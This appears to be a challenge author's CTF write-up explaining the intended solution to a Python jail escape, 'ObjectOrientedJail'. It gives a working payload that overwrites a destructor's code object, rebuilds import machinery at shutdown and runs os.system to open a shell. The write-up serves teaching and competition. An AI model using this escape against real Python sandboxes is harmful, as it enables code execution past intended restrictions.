# National Cyber Security Congress

[NCSC](https://www.facebook.com/NationalCSC), organized by Securinets, in it's 4th edition included a 12-hour CTF. As a technical team member, I had the chance to write some Binary Exploitation & Jail challenges. The tasks were a bit challenging & I'm glad a few enjoyed their time, despite the lack of solves.

This is going to be a writeup for the following challenges:
* [ObjectOrientedJail](#ObjectOrientedJail) (PyJail)
* [PyCryptoJail](#PyCryptoJail) (PyJail)
* [Formatter Specialist](#formatter-specialist) (Pwn)

For the challenge files & solvers:
* [ObjectOrientedJail](/2023/NCSC/src/objectorientedjail)
* [PyCryptoJail](/2023/NCSC/src/pycryptojail)
* [Formatter Specialist](/2023/NCSC/src/formatterspecialist)

---

### ObjectOrientedJail
Alright, so as far as I know, in order to escape from this jail you'll have to get creative. I couldn't find any simillar solutions nor unintended ways (however, if you find one I would love to know about it) for this challenge.

For this one, I was inspired from prototype pollution vulnerability in JS in order to change an object's properties/functions. Given the source code, we find a `Jail` class defined as the following:

```python
class Jail:
    def __init__(self):
        self.path = self
        self.copy = None
        self.call = False
    
    def cd(self, d):
        self.path = getattr(self.path, d)
    
    def setAttr(self, attr):
        setattr(self.path, attr, self.copy)
    
    def savePath(self):
        if self.copy is None:
            self.copy = self.path
    
    def makeCall(self, args):
        if self.call:
            return
        self.call = True
        self.copy = self.copy(*args)
    
    def reset(self):
        self.path = self
    
    def __del__(self):
        print("Bye")
        self.copy = None
        self.path = self
```

And then we get an instance of that class & we are able to basically use the class methods using a menu:

```python
a = Jail()
while True:
    print("1. Change path")
    print("2. Save path")
    print("3. Make a call")
    print("5. Reset")
    print("6. Give up")
    
    choice = int(input('> '))
    
    if choice == 1:
        path = input('New path: ')
        a.cd(path)
    
    elif choice == 2:
        a.savePath()

    elif choice == 3:
        args = safeReadArgs()
        a.makeCall(args)
    
    elif choice == 4:
        attr = input('Attribute: ')
        assert "path" not in attr and "copy" not in attr and "call" not in attr, "nope"
        a.setAttr(attr)
    
    elif choice == 5:
        a.reset()
    
    elif choice == 6:
        break
```

Before going any deeper, if we run the script & exit it properly, we can see the following:

<p align="center">
    <img src="/2023/NCSC/img/1.png"><br/>
</p>

We can notice the "bye" at the end of the execution, if we actually look at the code, it's being printed from the class destructor `__del__`:

```python
class Jail:
    ...
    def __del__(self):
        print("Bye")
        self.copy = None
        self.path = self
```

I added that as a way to show that the destructor is actually called at the end of the execution of the script.

That aside, we can see a `safeReadArgs` function being used & does a few checks:

```python
def safeReadArgs():
    args = input("Args tuple: ")
    assert len(args) <= 570, "Aint that a bit too long?"
    code = compile(args, "tmp", "single")
    args = code.co_consts[0]
    assert type(args) == tuple, "What you doing?"
    return args
```

So the length limit is 570 & our input (which is likely somekind of argument) must be of type `tuple`. In case you're not familiar with `compile` or `code` objects, this is a good chance to dive a bit into them.

The `compile` function will compile a given code & return a `code` object, which is used to represent the bytecode of the compiled code & a few more other properties, such as `co_consts`.

In general, any constant values used by a python code is stored in the `co_consts` array. Which is indexed later on by the compiled bytecode in order to execute the script properly. We'll dive more into these later on, this should be enough for this point.

So, if you try to compile the following code: `x=5; y=6; z=x+y`, 5 & 6 are going to be in `co_consts`. If you try `(5,6)`, that tuple is considered a constant & will be stored there, which is exactly what the `safeReadArgs` is using.

Okay, now we go back to our `Jail` class. We have 3 attributes:
 - `path`
 - `copy`
 - `call`

The `call` is only used here:

```python
class Jail:
    ...
    def makeCall(self, args):
        if self.call:
            return
        self.call = True
        self.copy = self.copy(*args)
    ...
```

So, it's simply used to verify if we used the `makeCall` method or no & we can use it only once. This method uses the `copy` as a callable object & calls it using a given `args` which can be traced back to our input via the `safeReadArgs` function. The arguments are spreaded as the function parameters. Also we notice that the result is stored in `copy` again.

Now, we have the following functions to review:

```python
class Jail:
    ...
    def cd(self, d):
        self.path = getattr(self.path, d)
    
    def setAttr(self, attr):
        setattr(self.path, attr, self.copy)
    
    def savePath(self):
        if self.copy is None:
            self.copy = self.path
    
    def reset(self):
        self.path = self
```

The `cd` function is used to navigate in `path` attributes, `reset` sets it back to `self`.

The `savePath` function is going to set `copy` value to `path` only if it's **None** & we can use `setAttr` to set a new attribute for `path` with the value of `copy`.

These are our tools, now knowledge time. Going back to the destructor, if we manage to override/overwrite it with our own function, we'll be able to get a code execution! But how?

Well, everything is based on objects in python, even functions. Each function has it's own attribute called `__code__` that contains the full logic of the function: Arguments count, named arg count, bytecode, variable names... We can simply check the help page for the `__code__`:

```python
def f():pass
help(f.__code__)
```

<p align="center">
    <img src="/2023/NCSC/img/2.png"><br/>
</p>

The constructor contains all the required details in order to define a function.

The catch is, `__code__` is **not** read only, you **can** change the logic of a function by simply changing it's `__code__` object! Do you see where this is going yet?

A possible exploitation scenario (intended one):
1. Navigate to a function's `__code__` object, navigate to it's `__class__` attribute.
2. Save the `__class__` attribute. Now we have a callable `code` class.
3. Instantiate a new `code` object, saving it in `copy`.
4. Navigate back to self -> `__class__` -> `__del__`
5. Set the `__code__` attribute for the `__del__` to your new function code, saved in `copy`.

And now you have a code execution! However, we still have more fun.

If we try to construct our own function locally, we can easly dump the required parameters for it's code class as the following, we can also setup a small test class to try things out:

```python
class A:
    def __del__(s): pass

def f(x):
    print("Hello!")
x = (f.__code__.co_argcount, f.__code__.co_posonlyargcount, f.__code__.co_kwonlyargcount, f.__code__.co_nlocals, f.__code__.co_stacksize, f.__code__.co_flags, f.__code__.co_code, f.__code__.co_consts, f.__code__.co_names, f.__code__.co_varnames, f.__code__.co_filename, f.__code__.co_name, f.__code__.co_firstlineno, f.__code__.co_linetable, f.__code__.co_freevars, f.__code__.co_cellvars)
print(x)

a = A()
A.__del__.__code__ = f.__code__
```

Running the above script will result in this:

<p align="center">
    <img src="/2023/NCSC/img/3.png"><br/>
</p>

It works! so far...

How about we try to construct a useful function? Like, opening a shell? We need a shell since the flag name is random.

```python
def f(x):
    import os
    os.system('id')
```

We get the following if we use that:

<p align="center">
    <img src="/2023/NCSC/img/4.png"><br/>
</p>

This is getting interesting, since the script finished it's execution, python got rid of some environments required by import **then** called the destructor. Here comes the final piece of the puzzle,

```python
import sys
```

`sys` is already imported at the top of the script. This is the fun part, if we want to get a shell (or import modules), we'll need to re-initialize everything. We can start by checking what's actually stored in `sys.meta_path`:

<p align="center">
    <img src="/2023/NCSC/img/5.png"><br/>
</p>

We'll need those classes! This is a straight-forward one, since it's a class, it'll be a sub-class of `object`. The dockerfile was provided for this to be sure of the indexes. We can start from a list object, climb up till we reach `object` & then we call `__subclasses__()` to get it's sub-classes, then it's a matter of finding the correct index:

```python
def f(x):
    x = [].__class__.__base__.__subclasses__()
    sys.meta_path = [x[104], x[121]]
```

Also yes, `meta_path` had 3 classes however, only 2 are needed for us to import. How to know that? after constructing the full payload we can (or, we have to) tweak some stuff to make it shorter, we basically try to optimize it. Those classes are:

- `<class '_frozen_importlib.BuiltinImporter'>`
- `<class '_frozen_importlib_external.PathFinder'>`

Okay, can I import now? not yet! A new error appears:

<p align="center">
    <img src="/2023/NCSC/img/6.png"><br/>
</p>

At least we can see what files are causing the error. You might not see a file but `<frozen importlib._bootstrap_external>` is kindof a compiled module, used to increase execution speed. Not important for us, however, we can find the files for this module locally! We just need to look for `importlib` module. Easiest way:

```python
import importlib
importlib.__path__
>> ['/usr/lib/python3.10/importlib']
```

<p align="center">
    <img src="/2023/NCSC/img/7.png"><br/>
</p>

Now, debug time! Trace the error & reverse how importing works! This is the source of the error:

<p align="center">
    <img src="/2023/NCSC/img/8.png"><br/>
</p>

`TypeError: 'NoneType' object is not iterable`, which means, `path` is set to `None` & that shouldn't be like that. We can trace the stack of error to the function before this, at line 1439.

<p align="center">
    <img src="/2023/NCSC/img/9.png"><br/>
</p>

We have a new lead: `path = sys.path`. We check:

```python
import sys
sys.path
>>> ['', '/usr/lib/python310.zip', '/usr/lib/python3.10', '/usr/lib/python3.10/lib-dynload', '/home/m0ngi/.local/lib/python3.10/site-packages', '/usr/local/lib/python3.10/dist-packages', '/usr/local/lib/python3.10/dist-packages/decomp2dbg-2.2.0-py3.10.egg', '/usr/local/lib/python3.10/dist-packages/pyelftools-0.29-py3.10.egg', '/usr/local/lib/python3.10/dist-packages/pyjnius-1.4.2-py3.10-linux-x86_64.egg', '/usr/lib/python3/dist-packages', '/usr/lib/python3.10/dist-packages']
```

This might be different from the one you get from your system **but** there will always be a commun part: ['/usr/lib/python3.10'].

As we did above, we can take everything & then remove an element each time & check if it'll work out or nah.

And a different error:

```
Exception ignored in: <function A.__del__ at 0x7fa4666e7f40>
Traceback (most recent call last):
  File "/home/m0ngi/CTF-Tasks/pyjail/jail 4/solve.py", line 53, in f
  File "<frozen importlib._bootstrap>", line 1027, in _find_and_load
  File "<frozen importlib._bootstrap>", line 1002, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 945, in _find_spec
  File "<frozen importlib._bootstrap_external>", line 1439, in find_spec
  File "<frozen importlib._bootstrap_external>", line 1408, in _get_spec
  File "<frozen importlib._bootstrap_external>", line 1372, in _path_importer_cache
TypeError: 'NoneType' object is not subscriptable
```

We keep going! This is the block:

```python
try:
    finder = sys.path_importer_cache[path]
except KeyError:
    finder = cls._path_hooks(path)
    sys.path_importer_cache[path] = finder
return finder
```

To be specific, `finder = sys.path_importer_cache[path]`.

We can check that `path_importer_cache` is set to **None** too. If we look at the code, we can see that this is somekind of a module cache. We can either try to construct it OR we can relay on the exception handler to find it & upcate. So we can use an empty dict {} for this.

The next error would help to reinit the value of `path_hooks`.
And now we can import!

Final code:

```python
def f(x):
    x = [].__class__.__base__.__subclasses__()
    sys.meta_path = [x[104], x[121]]
    sys.path_importer_cache = {}
    sys.path_hooks = [x[122].path_hook(( (x[118].__subclasses__()[0], ['.py']) ))]
    sys.path = ['/usr/lib/python3.10']
    import os
    os.system('ls')
```

And this gives:

```python
(1, 0, 0, 2, 4, 67, b'g\x00j\x00j\x01\xa0\x02\xa1\x00}\x00|\x00d\x01\x19\x00|\x00d\x02\x19\x00g\x02t\x03_\x04i\x00t\x03_\x05|\x00d\x03\x19\x00\xa0\x06|\x00d\x04\x19\x00\xa0\x02\xa1\x00d\x05\x19\x00d\x06g\x01f\x02\xa1\x01g\x01t\x03_\x07d\x07g\x01t\x03_\x08d\x05d\x00l\t}\x01|\x01\xa0\nd\x08\xa1\x01\x01\x00d\x00S\x00', (None, 104, 121, 122, 118, 0, '.py', '/usr/lib/python3.10', 'ls'), ('__class__', '__base__', '__subclasses__', 'sys', 'meta_path', 'path_importer_cache', 'path_hook', 'path_hooks', 'path', 'os', 'system'), ('x', 'os'), '/home/m0ngi/CTF-Tasks/pyjail/jail 4/solve.py', 'f', 49, b'\x0c\x01\x12\x01\x06\x01$\x01\x08\x01\x08\x01\x0e\x01', (), ())
```

We have to get it to length 570! we can set the path to an empty string, remove any spaces... There is one extra step! Optimizing the bytecode! As you may notice, the **None** value is saved & used by the bytecode however it's not important here, we can get rid of it. To view opcodes of the function we can use `dis` module to view opcodes, disassemble a code object to get it's opcodes... Or we can use this:

```python
from opcode import opmap as OPCODE_MAPPING

inv = {y: x for x, y in OPCODE_MAPPING.items()}
op = b'' # bytecode
print('\n'.join([str(i) + "- " + inv[op[i]] + " " + str(op[i+1]) for i in range(0, len(op)-1, 2) if inv.get(op[i])]))
```

The shortest bytecode & arguments I reached are the following:

```python
opcode = "g\\x00j\\x00j\\x01\\xa0\\x02\\xa1\\x00}\\x00" + \
         "|\\x00d\\x01\\x19\\x00|\\x00d\\x02\\x19\\x00g\\x02t\\x03_\\x04" + \
         "i\\x00t\\x03_\\x06" + \
         "|\\x00d\\x03\\x19\\x00\\xa0\\x05|\\x00d\\x04\\x19\\x00\\xa0\\x02\\xa1\\x00d\\x00\\x19\\x00d\\x05g\\x01f\\x02\\xa1\\x01g\\x01t\\x03_\\x07" + \
         "d\\x06g\\x01t\\x03_\\x08" + \
         "d\\x00d\\x00l\\t" + \
         "\\xa0\\n" + \
         "d\\x07" + \
         "\\xa1\\x01"

args = "(1,0,0,6,4,0,b'%s',(0,104,121,122,118,'.py','/usr/lib/python3.10','sh'),('__class__','__base__','__subclasses__','sys','meta_path','path_hook','path_importer_cache','path_hooks','path','os','system'), ('x',),'','',35,b'\\x0c\\x01\\x12\\x01\\x08\\x01\\x10\\x01\\x10\\x02\\x06\\x01\\x08\\x01\\x08\\x01\\x08\\x01\\x0e\\x01',(),())" % (opcode,)
```

At this point, it's done! You can import os & pop a shell!

### PyCryptoJail
WIP

### Formatter Specialist
WIP